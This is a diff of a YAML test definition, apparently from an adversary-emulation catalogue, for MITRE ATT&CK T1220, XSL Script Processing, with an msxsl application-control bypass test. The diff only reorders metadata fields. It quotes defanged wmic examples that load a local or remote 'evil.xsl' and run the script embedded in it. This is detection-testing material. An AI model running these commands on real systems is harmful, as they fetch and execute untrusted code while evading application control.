@@ -1,15 +1,3 @@
-guid: ca23bfb2-023f-49c5-8802-e66997de462d
-name: MSXSL Bypass using local files
-tactic:
-  - defense-evasion
-technique:
-  - T1220
-sigma: false
-sigma_rule: []
-os:
-  - windows
-description: "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet\
-  \ Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n"
 Attack_name: XSL Script Processing
 Attack_description: |-
   Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
@@ -28,3 +16,15 @@ Attack_description: |-
 
   * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
   * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+guid: ca23bfb2-023f-49c5-8802-e66997de462d
+name: MSXSL Bypass using local files
+tactic:
+  - defense-evasion
+technique:
+  - T1220
+os:
+  - windows
+description: "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet\
+  \ Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n"
+sigma: false
+sigma_rule: []
